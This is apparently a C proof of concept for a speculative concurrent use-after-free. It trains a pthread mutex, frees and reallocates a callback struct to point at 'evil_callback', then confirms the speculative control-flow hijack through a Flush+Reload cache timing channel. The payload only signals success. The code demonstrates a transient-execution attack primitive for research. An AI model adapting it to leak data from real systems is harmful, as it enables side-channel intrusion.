#include <stdio.h>
#include <pthread.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>

#include "fr.h"

/* Flush+Reload buffer. */
#define FR_BUFF_SIZE (2 * 4096)
char fr_buff[FR_BUFF_SIZE] __attribute__((aligned(4096)));

/* Vulnerable lock. */
volatile int r __cacheline_aligned;
pthread_mutex_t lock;

/* Gadget-related code/data. */
void my_callback()
{
}

void evil_callback()
{
    /* We use the second entry of the F+R buffer to signal successful control-flow hijack. */
    maccess(&fr_buff[4096]);
}

typedef void (*cb_t)();
typedef struct data_s
{
    cb_t callback;
} data_t;
data_t *data_ptr;

/* Utility functions. */
void train_lock()
{
    int i;
    for (i = 0; i < 10; i++)
    {
        pthread_mutex_lock(&lock);
        pthread_mutex_unlock(&lock);
    }
}

void init()
{
    /* Initialize Flush+Reload Buffer. */
    memset(fr_buff, 'x', FR_BUFF_SIZE);
    flush(&fr_buff[0]);
    flush(&fr_buff[4096]);

    /* Initialize victim lock. */
    int r;
    r = pthread_mutex_init(&lock, NULL);
    assert(r == 0 && "pthread_mutex_init failed");

    /* Initialize victim memory slot. */
    data_ptr = malloc(sizeof(data_t));
    data_ptr->callback = my_callback;
}

/* Main functions. */
int main()
{
    /* Initialize. */
    init();

    /* Thread 1: Train the lock to be always taken. */
    train_lock();

    /* Thread 1: Trigger the free gadget. */
    pthread_mutex_lock(&lock);
    free(data_ptr);

    /* Thread 2: Thread 1 is interrupted after free() before state is updated and lock is released. Then, Thread 2 reuses memory to control future dangling pointer dereferences (and hijack control flow to the evil callback). */
    data_t *p = malloc(sizeof(data_t));
    p->callback = evil_callback;
    assert(p);

    /* Thread 2: Trigger the use gadget. This will only execute a UAF (i.e.,  control-flow hijack) speculatively. Note: we cannot use pthread_mutex_lock here as it would deadlock us architecturally within the same pthread. Instead, we use pthread_mutex_trylock to simulate the vulnerable inner branch of pthread_mutex_lock. */
    r = pthread_mutex_trylock(&lock);
    flush(&r);
    if (likely(r == 0))
    {
        data_ptr->callback();
        pthread_mutex_unlock(&lock);
    }

    /* Thread 1: Resume execution and terminate the free critical section. */
    data_ptr = NULL;
    pthread_mutex_unlock(&lock);

    /* Thread 2: Check signal via F+R covert channel. */
    unsigned long t1 = probe_timing(&fr_buff[0]);
    unsigned long t2 = probe_timing(&fr_buff[4096]);
    if (t2 < t1)
    {
        printf("Got signal (%lu < %lu): Memory reuse, Speculative UAF, and Speculative control-flow hijack triggered successfully.\n", t2, t1);
    }
    else
    {
        printf("Unexpected timings: %lu << %lu\n", t1, t2);
    }

    return 0;
}
